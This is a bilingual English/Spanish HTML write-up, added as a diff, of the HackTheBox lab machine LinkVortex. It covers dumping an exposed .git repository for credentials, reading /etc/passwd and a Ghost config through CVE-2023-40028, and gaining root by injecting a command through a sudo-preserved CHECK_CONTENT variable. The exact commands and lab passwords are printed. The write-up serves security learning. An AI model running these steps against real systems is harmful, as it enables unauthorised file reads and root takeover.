@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>linkvortex | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">linkvortex</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running Ghost CMS version 5.58 on the main web server, with an exposed <code>.git</code> directory on a development subdomain. Using git-dumper, I extracted the repository contents and discovered hardcoded credentials in the commit history.</p>
+                    
+                    <p>These credentials granted access to the Ghost CMS admin panel, allowing exploitation of CVE-2023-40028, an arbitrary file read vulnerability through symlink uploads. By leveraging this vulnerability, I was able to read the Ghost configuration file which contained SSH credentials for the user <code>bob</code>, providing initial access to the host machine.</p>
+                    
+                    <p>Privilege escalation was achieved by exploiting a vulnerable sudo configuration that allowed executing a bash script with a preserved environment variable. The script contained a command injection vulnerability in an if statement that directly executed the <code>CHECK_CONTENT</code> environment variable without proper validation, allowing arbitrary command execution as root.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Git repository exposure via git-dumper, Ghost CMS arbitrary file read via symlink upload (CVE-2023-40028), sudo privilege escalation through environment variable command injection.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services on the target:</p>
+                <p><img src="./media/image3.png"
+                        alt="Nmap scan results showing open ports on the target machine" />
+                </p>
+
+                <p>The scan reveals standard services including SSH on port 22 and HTTP on port 80. I add <code>linkvortex.htb</code> to my <code>/etc/hosts</code> file and proceed with web enumeration.</p>
+
+                <h2>Web Enumeration - Ghost CMS Discovery</h2>
+                <p>Running <code>whatweb</code> against the main domain reveals interesting information:</p>
+                <pre><code class="language-plaintext">http://linkvortex.htb/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], 
+IP[10.10.11.47], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], 
+PoweredBy[Ghost,a], Script[application/ld+json], Title[BitByBit Hardware], 
+X-Powered-By[Express], X-UA-Compatible[IE=edge]</code></pre>
+
+                <p>The application is using <strong>Ghost CMS version 5.58</strong> (<a href="https://ghost.org/">https://ghost.org/</a>). This version is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-40028">CVE-2023-40028</a>, which allows authenticated users to upload files that are symlinks, enabling arbitrary file reads on the host operating system.</p>
+
+                <p>I locate the Ghost admin login panel at <code>http://linkvortex.htb/ghost/#/signin</code>, but I don't have credentials yet to exploit this vulnerability.</p>
+
+                <h2>Virtual Host Discovery</h2>
+                <p>Scanning for virtual hosts, I discover a development subdomain:</p>
+                <pre><code class="language-plaintext">dev.linkvortex.htb Status: 200 [Size: 2538]</code></pre>
+
+                <p>I add this to my <code>/etc/hosts</code> file and investigate. Running whatweb against this new subdomain:</p>
+                <pre><code class="language-bash">whatweb http://dev.linkvortex.htb/</code></pre>
+                <pre><code class="language-plaintext">http://dev.linkvortex.htb/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, 
+HTTPServer[Apache], IP[10.10.11.47], Script, Title[Launching Soon]</code></pre>
+
+                <p>The page displays a simple "Launching Soon" message:</p>
+                <p><img src="./media/image1.png"
+                        alt="Development subdomain showing a 'Launching Soon' page" />
+                </p>
+
+                <h2>Git Repository Exposure</h2>
+                <p>Running <code>nikto</code> against the development subdomain reveals an exposed <code>.git</code> directory:</p>
+                <p><img src="./media/image2.png"
+                        alt="Nikto scan results showing exposed .git directory" />
+                </p>
+
+                <p>This is a critical finding. An exposed Git repository can leak sensitive information including credentials, API keys, and internal application details. I use <code>git-dumper</code> (<a href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a>) to extract the repository contents:</p>
+                <pre><code class="language-bash">git-dumper http://dev.linkvortex.htb/.git/ ./dev.linkvortex</code></pre>
+
+                <h3>Analyzing the Git History</h3>
+                <p>After dumping the repository, I examine the commit history and staged changes. In one of the test files within the staged changes, I discover hardcoded credentials:</p>
+                <pre><code class="language-plaintext">OctopiFociPilfer45</code></pre>
+
+                <p>Since I saw posts on the main website authored by a user named "admin", I attempt to log in with these credentials at the Ghost admin panel:</p>
+                <pre><code class="language-plaintext">admin@linkvortex.htb:OctopiFociPilfer45</code></pre>
+
+                <p>The credentials are valid, granting me access to the Ghost CMS dashboard.</p>
+
+                <h2>Exploiting Ghost CMS - CVE-2023-40028</h2>
+                <p>Now that I have authenticated access, I can exploit the CVE-2023-40028 vulnerability. I use the proof-of-concept exploit from <a href="https://github.com/0xyassine/CVE-2023-40028">https://github.com/0xyassine/CVE-2023-40028</a>.</p>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>This vulnerability exploits Ghost CMS's ability to upload files through the admin interface. While Ghost is supposed to validate uploads, the version 5.58 allows authenticated users to upload symbolic links. By creating a symlink pointing to sensitive files on the host system and uploading it through Ghost, an attacker can read arbitrary files.</p>
+
+                <p>The exploit provides an interactive shell interface for specifying files to read:</p>
+                <pre><code class="language-bash">bash CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45</code></pre>
+
+                <pre><code class="language-plaintext">WELCOME TO THE CVE-2023-40028 SHELL
+
+file> /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+(...)
+node:x:1000:1000::/home/node:/bin/bash</code></pre>
+
+                <p>The presence of the <code>node</code> user and the limited user list suggests this might be running inside a container environment.</p>
+
+                <h3>Discovering Configuration Files</h3>
+                <p>While examining the dumped Git repository earlier, I noticed references to a file called <code>Dockerfile.ghost</code> which mentioned the configuration path:</p>
+                <pre><code class="language-plaintext">/var/lib/ghost/config.production.json</code></pre>
+
+                <p>I use the arbitrary file read exploit to retrieve this configuration file:</p>
+                <pre><code class="language-bash">file> /var/lib/ghost/config.production.json</code></pre>
+
+                <p>The configuration file reveals database credentials:</p>
+                <pre><code class="language-json">"auth": {
+    "user": "bob@linkvortex.htb",
+    "pass": "fibber-talented-worth"
+}</code></pre>
+
+                <h2>Initial Access - SSH as Bob</h2>
+                <p>Since these credentials appear to be for a user named "bob", I attempt SSH authentication with password reuse:</p>
+                <pre><code class="language-bash">ssh bob@linkvortex.htb</code></pre>
+
+                <p>Using the password <code>fibber-talented-worth</code>, I successfully authenticate and gain access to the host machine as the user <code>bob</code>. I can now retrieve the user flag.</p>
+
+                <h2>Privilege Escalation - Sudo Configuration Analysis</h2>
+                <p>After gaining initial access, I check what sudo privileges the <code>bob</code> user has:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">Matching Defaults entries for bob on linkvortex:
+    env_reset, mail_badpass, 
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, 
+    use_pty, env_keep+=CHECK_CONTENT
+
+User bob may run the following commands on linkvortex:
+    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png</code></pre>
+
+                <p>Two things stand out here:</p>
+                <ol>
+                    <li>Bob can execute a specific bash script as root without a password</li>
+                    <li>The <code>env_keep+=CHECK_CONTENT</code> configuration preserves the <code>CHECK_CONTENT</code> environment variable when using sudo</li>
+                </ol>
+
+                <h3>Analyzing the Vulnerable Script</h3>
+                <p>Let me examine the <code>clean_symlink.sh</code> script:</p>
+                <pre><code class="language-bash">#!/bin/bash
+
+QUAR_DIR="/var/quarantined"
+
+if [ -z $CHECK_CONTENT ];then
+    CHECK_CONTENT=false
+fi
+
+LINK=$1
+
+if ! [[ "$LINK" =~ \.png$ ]]; then
+    /usr/bin/echo "! First argument must be a png file !"
+    exit 2
+fi
+
+if /usr/bin/sudo /usr/bin/test -L $LINK;then
+    LINK_NAME=$(/usr/bin/basename $LINK)
+    LINK_TARGET=$(/usr/bin/readlink $LINK)
+    
+    if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
+        /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
+        /usr/bin/unlink $LINK
+    else
+        /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
+        /usr/bin/mv $LINK $QUAR_DIR/
+        
+        if $CHECK_CONTENT;then
+            /usr/bin/echo "Content:"
+            /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
+        fi
+    fi
+fi</code></pre>
+
+                <h3>Identifying the Command Injection Vulnerability</h3>
+                <p>The script has a critical vulnerability in this line:</p>
+                <pre><code class="language-bash">if $CHECK_CONTENT;then</code></pre>
+
+                <p>Instead of checking the value of <code>$CHECK_CONTENT</code> with proper quoting like <code>if [ "$CHECK_CONTENT" = "true" ]</code>, the script directly executes whatever is in the <code>CHECK_CONTENT</code> variable as a command. This is a command injection vulnerability.</p>
+
+                <p>The attack logic works as follows:</p>
+                <ol>
+                    <li>Create a <code>.png</code> file that is actually a symlink to pass the extension check</li>
+                    <li>Set the <code>CHECK_CONTENT</code> environment variable to an arbitrary command</li>
+                    <li>Execute the script with sudo - the environment variable is preserved due to <code>env_keep</code></li>
+                    <li>The script will execute our command in the final if statement as root</li>
+                </ol>
+
+                <h3>Proof of Concept</h3>
+                <p>First, I test the concept by creating a symlink and executing <code>whoami</code>:</p>
+                <pre><code class="language-bash">ln -s user.txt xd.png
+CHECK_CONTENT=whoami sudo /usr/bin/bash /opt/ghost/clean_symlink.sh ./xd.png</code></pre>
+
+                <pre><code class="language-plaintext">Link found [ ./xd.png ] , moving it to quarantine
+root
+Content:</code></pre>
+
+                <p>Perfect! The command executes as root. Now I can escalate to a root shell.</p>
+
+                <h3>Gaining Root Access</h3>
+                <p>I modify the command to spawn a bash shell as root:</p>
+                <pre><code class="language-bash">ln -s user.txt xd.png
+CHECK_CONTENT="/bin/bash" sudo /usr/bin/bash /opt/ghost/clean_symlink.sh ./xd.png</code></pre>
+
+                <pre><code class="language-plaintext">Link found [ ./xd.png ] , moving it to quarantine
+root@linkvortex:/home/bob#</code></pre>
+
+                <p>I now have a root shell and can retrieve the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba Ghost CMS versión 5.58 en el servidor web principal, con un directorio <code>.git</code> expuesto en un subdominio de desarrollo. Utilizando git-dumper, extraje los contenidos del repositorio y descubrí credenciales hardcodeadas en el historial de commits.</p>
+                    
+                    <p>Estas credenciales permitieron acceso al panel de administración de Ghost CMS, facilitando la explotación de CVE-2023-40028, una vulnerabilidad de lectura arbitraria de archivos mediante la subida de symlinks. Aprovechando esta vulnerabilidad, pude leer el archivo de configuración de Ghost que contenía credenciales SSH para el usuario <code>bob</code>, proporcionando acceso inicial a la máquina host.</p>
+                    
+                    <p>La escalada de privilegios se consiguió explotando una configuración vulnerable de sudo que permitía ejecutar un script bash con una variable de entorno preservada. El script contenía una vulnerabilidad de inyección de comandos en una sentencia if que ejecutaba directamente la variable de entorno <code>CHECK_CONTENT</code> sin validación adecuada, permitiendo ejecución arbitraria de comandos como root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Exposición de repositorio Git mediante git-dumper, Ghost CMS lectura arbitraria de archivos mediante subida de symlinks (CVE-2023-40028), escalada de privilegios sudo mediante inyección de comandos en variable de entorno.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en el objetivo:</p>
+                <p><img src="./media/image3.png"
+                        alt="Resultados del escaneo de nmap mostrando puertos abiertos en la máquina objetivo" />
+                </p>
+
+                <p>El escaneo revela servicios estándar incluyendo SSH en el puerto 22 y HTTP en el puerto 80. Añado <code>linkvortex.htb</code> a mi archivo <code>/etc/hosts</code> y procedo con la enumeración web.</p>
+
+                <h2>Enumeración Web - Descubrimiento de Ghost CMS</h2>
+                <p>Ejecutando <code>whatweb</code> contra el dominio principal revela información interesante:</p>
+                <pre><code class="language-plaintext">http://linkvortex.htb/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], 
+IP[10.10.11.47], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], 
+PoweredBy[Ghost,a], Script[application/ld+json], Title[BitByBit Hardware], 
+X-Powered-By[Express], X-UA-Compatible[IE=edge]</code></pre>
+
+                <p>La aplicación utiliza <strong>Ghost CMS versión 5.58</strong> (<a href="https://ghost.org/">https://ghost.org/</a>). Esta versión es vulnerable a <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-40028">CVE-2023-40028</a>, que permite a usuarios autenticados subir archivos que son symlinks, habilitando la lectura arbitraria de archivos en el sistema operativo host.</p>
+
+                <p>Localizo el panel de login de administración de Ghost en <code>http://linkvortex.htb/ghost/#/signin</code>, pero aún no tengo credenciales para explotar esta vulnerabilidad.</p>
+
+                <h2>Descubrimiento de Virtual Hosts</h2>
+                <p>Escaneando virtual hosts, descubro un subdominio de desarrollo:</p>
+                <pre><code class="language-plaintext">dev.linkvortex.htb Status: 200 [Size: 2538]</code></pre>
+
+                <p>Lo añado a mi archivo <code>/etc/hosts</code> e investigo. Ejecutando whatweb contra este nuevo subdominio:</p>
+                <pre><code class="language-bash">whatweb http://dev.linkvortex.htb/</code></pre>
+                <pre><code class="language-plaintext">http://dev.linkvortex.htb/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, 
+HTTPServer[Apache], IP[10.10.11.47], Script, Title[Launching Soon]</code></pre>
+
+                <p>La página muestra un simple mensaje de "Launching Soon":</p>
+                <p><img src="./media/image1.png"
+                        alt="Subdominio de desarrollo mostrando una página 'Launching Soon'" />
+                </p>
+
+                <h2>Exposición de Repositorio Git</h2>
+                <p>Ejecutando <code>nikto</code> contra el subdominio de desarrollo revela un directorio <code>.git</code> expuesto:</p>
+                <p><img src="./media/image2.png"
+                        alt="Resultados del escaneo de nikto mostrando el directorio .git expuesto" />
+                </p>
+
+                <p>Este es un hallazgo crítico. Un repositorio Git expuesto puede filtrar información sensible incluyendo credenciales, claves API y detalles internos de la aplicación. Utilizo <code>git-dumper</code> (<a href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a>) para extraer los contenidos del repositorio:</p>
+                <pre><code class="language-bash">git-dumper http://dev.linkvortex.htb/.git/ ./dev.linkvortex</code></pre>
+
+                <h3>Analizando el Historial de Git</h3>
+                <p>Tras volcar el repositorio, examino el historial de commits y los cambios staged. En uno de los archivos de test dentro de los cambios staged, descubro credenciales hardcodeadas:</p>
+                <pre><code class="language-plaintext">OctopiFociPilfer45</code></pre>
+
+                <p>Como vi posts en el sitio web principal del usuario "admin", intento hacer login con estas credenciales en el panel de administración de Ghost:</p>
+                <pre><code class="language-plaintext">admin@linkvortex.htb:OctopiFociPilfer45</code></pre>
+
+                <p>Las credenciales son válidas, otorgándome acceso al dashboard de Ghost CMS.</p>
+
+                <h2>Explotando Ghost CMS - CVE-2023-40028</h2>
+                <p>Ahora que tengo acceso autenticado, puedo explotar la vulnerabilidad CVE-2023-40028. Utilizo el exploit proof-of-concept de <a href="https://github.com/0xyassine/CVE-2023-40028">https://github.com/0xyassine/CVE-2023-40028</a>.</p>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>Esta vulnerabilidad explota la capacidad de Ghost CMS de subir archivos mediante la interfaz de administración. Aunque se supone que Ghost debe validar las subidas, la versión 5.58 permite a usuarios autenticados subir enlaces simbólicos. Creando un symlink que apunte a archivos sensibles en el sistema host y subiéndolo mediante Ghost, un atacante puede leer archivos arbitrarios.</p>
+
+                <p>El exploit proporciona una interfaz shell interactiva para especificar archivos a leer:</p>
+                <pre><code class="language-bash">bash CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45</code></pre>
+
+                <pre><code class="language-plaintext">WELCOME TO THE CVE-2023-40028 SHELL
+
+file> /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+(...)
+node:x:1000:1000::/home/node:/bin/bash</code></pre>
+
+                <p>La presencia del usuario <code>node</code> y la limitada lista de usuarios sugiere que esto podría estar ejecutándose dentro de un entorno de contenedor.</p>
+
+                <h3>Descubriendo Archivos de Configuración</h3>
+                <p>Al examinar el repositorio Git volcado anteriormente, noté referencias a un archivo llamado <code>Dockerfile.ghost</code> que mencionaba la ruta de configuración:</p>
+                <pre><code class="language-plaintext">/var/lib/ghost/config.production.json</code></pre>
+
+                <p>Utilizo el exploit de lectura arbitraria de archivos para recuperar este archivo de configuración:</p>
+                <pre><code class="language-bash">file> /var/lib/ghost/config.production.json</code></pre>
+
+                <p>El archivo de configuración revela credenciales de base de datos:</p>
+                <pre><code class="language-json">"auth": {
+    "user": "bob@linkvortex.htb",
+    "pass": "fibber-talented-worth"
+}</code></pre>
+
+                <h2>Acceso Inicial - SSH como Bob</h2>
+                <p>Como estas credenciales parecen ser para un usuario llamado "bob", intento autenticación SSH con reutilización de contraseña:</p>
+                <pre><code class="language-bash">ssh bob@linkvortex.htb</code></pre>
+
+                <p>Usando la contraseña <code>fibber-talented-worth</code>, me autentico exitosamente y obtengo acceso a la máquina host como el usuario <code>bob</code>. Ahora puedo recuperar la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios - Análisis de Configuración Sudo</h2>
+                <p>Tras obtener el acceso inicial, compruebo qué privilegios sudo tiene el usuario <code>bob</code>:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">Matching Defaults entries for bob on linkvortex:
+    env_reset, mail_badpass, 
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, 
+    use_pty, env_keep+=CHECK_CONTENT
+
+User bob may run the following commands on linkvortex:
+    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png</code></pre>
+
+                <p>Dos cosas destacan aquí:</p>
+                <ol>
+                    <li>Bob puede ejecutar un script bash específico como root sin contraseña</li>
+                    <li>La configuración <code>env_keep+=CHECK_CONTENT</code> preserva la variable de entorno <code>CHECK_CONTENT</code> al usar sudo</li>
+                </ol>
+
+                <h3>Analizando el Script Vulnerable</h3>
+                <p>Examinemos el script <code>clean_symlink.sh</code>:</p>
+                <pre><code class="language-bash">#!/bin/bash
+
+QUAR_DIR="/var/quarantined"
+
+if [ -z $CHECK_CONTENT ];then
+    CHECK_CONTENT=false
+fi
+
+LINK=$1
+
+if ! [[ "$LINK" =~ \.png$ ]]; then
+    /usr/bin/echo "! First argument must be a png file !"
+    exit 2
+fi
+
+if /usr/bin/sudo /usr/bin/test -L $LINK;then
+    LINK_NAME=$(/usr/bin/basename $LINK)
+    LINK_TARGET=$(/usr/bin/readlink $LINK)
+    
+    if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
+        /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
+        /usr/bin/unlink $LINK
+    else
+        /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
+        /usr/bin/mv $LINK $QUAR_DIR/
+        
+        if $CHECK_CONTENT;then
+            /usr/bin/echo "Content:"
+            /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
+        fi
+    fi
+fi</code></pre>
+
+                <h3>Identificando la Vulnerabilidad de Inyección de Comandos</h3>
+                <p>El script tiene una vulnerabilidad crítica en esta línea:</p>
+                <pre><code class="language-bash">if $CHECK_CONTENT;then</code></pre>
+
+                <p>En lugar de comprobar el valor de <code>$CHECK_CONTENT</code> con comillas adecuadas como <code>if [ "$CHECK_CONTENT" = "true" ]</code>, el script ejecuta directamente lo que sea que esté en la variable <code>CHECK_CONTENT</code> como un comando. Esta es una vulnerabilidad de inyección de comandos.</p>
+
+                <p>La lógica del ataque funciona así:</p>
+                <ol>
+                    <li>Crear un archivo <code>.png</code> que sea en realidad un symlink para pasar la comprobación de extensión</li>
+                    <li>Establecer la variable de entorno <code>CHECK_CONTENT</code> a un comando arbitrario</li>
+                    <li>Ejecutar el script con sudo - la variable de entorno se preserva debido a <code>env_keep</code></li>
+                    <li>El script ejecutará nuestro comando en la sentencia if final como root</li>
+                </ol>
+
+                <h3>Prueba de Concepto</h3>
+                <p>Primero, pruebo el concepto creando un symlink y ejecutando <code>whoami</code>:</p>
+                <pre><code class="language-bash">ln -s user.txt xd.png
+CHECK_CONTENT=whoami sudo /usr/bin/bash /opt/ghost/clean_symlink.sh ./xd.png</code></pre>
+
+                <pre><code class="language-plaintext">Link found [ ./xd.png ] , moving it to quarantine
+root
+Content:</code></pre>
+
+                <p>¡Perfecto! El comando se ejecuta como root. Ahora puedo escalar a una shell root.</p>
+
+                <h3>Obteniendo Acceso Root</h3>
+                <p>Modifico el comando para generar una shell bash como root:</p>
+                <pre><code class="language-bash">ln -s user.txt xd.png
+CHECK_CONTENT="/bin/bash" sudo /usr/bin/bash /opt/ghost/clean_symlink.sh ./xd.png</code></pre>
+
+                <pre><code class="language-plaintext">Link found [ ./xd.png ] , moving it to quarantine
+root@linkvortex:/home/bob#</code></pre>
+
+                <p>Ahora tengo una shell root y puedo recuperar la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
